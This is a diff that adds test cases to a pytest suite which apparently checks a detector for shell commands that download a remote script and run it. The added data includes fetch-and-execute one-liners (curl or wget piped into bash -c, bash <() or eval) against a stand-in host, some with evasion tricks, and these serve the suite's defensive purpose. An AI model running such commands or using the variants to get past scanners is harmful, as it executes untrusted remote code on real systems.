@@ -154,6 +154,11 @@ def test_real_or_unproved_pipeline_still_flags(command: str, documented: bool) -
         "bash <(\n  curl -s https://payload.example/install.sh\n)",
         'bash -c "$(cd /tmp && curl -fsSL https://payload.example/install.sh)"',
         'bash -c "$(curl -fsSL https://payload.example/install.sh; : https://github.com)"',
+        'bash -c "$(: https://github.com; curl -fsSL https://payload.example/install.sh)"',
+        'bash -c "$(/usr/bin/curl -fsSL https://payload.example/install.sh)"',
+        "bash <(/usr/bin/curl -fsSL https://payload.example/install.sh)",
+        'eval "$(./bin/wget -qO- https://payload.example/env.sh)"',
+        'bash -c "$(curl -fsSL https://payload.example/install.sh 2>/dev/null)"',
     ],
 )
 @pytest.mark.parametrize("documented", [False, True], ids=["source", "markdown-fence"])
@@ -175,6 +180,9 @@ def test_fetch_executed_through_substitution_flags(command: str, documented: boo
         "diff <(curl https://payload.example/a) b.txt",
         "bash -c \"$(printf 'echo curl https://payload.example/status')\"",
         'eval "$(echo curl https://payload.example/status)"',
+        "bash -c \"$(curl https://payload.example/a >/dev/null; printf 'echo ok')\"",
+        "bash -c \"$(curl https://payload.example/a &>/dev/null; printf 'echo ok')\"",
+        "bash -c \"$(wget -qO- https://payload.example/a 1>log.txt; printf 'echo ok')\"",
     ],
 )
 def test_fetch_substitution_used_as_data_does_not_flag(command: str) -> None:
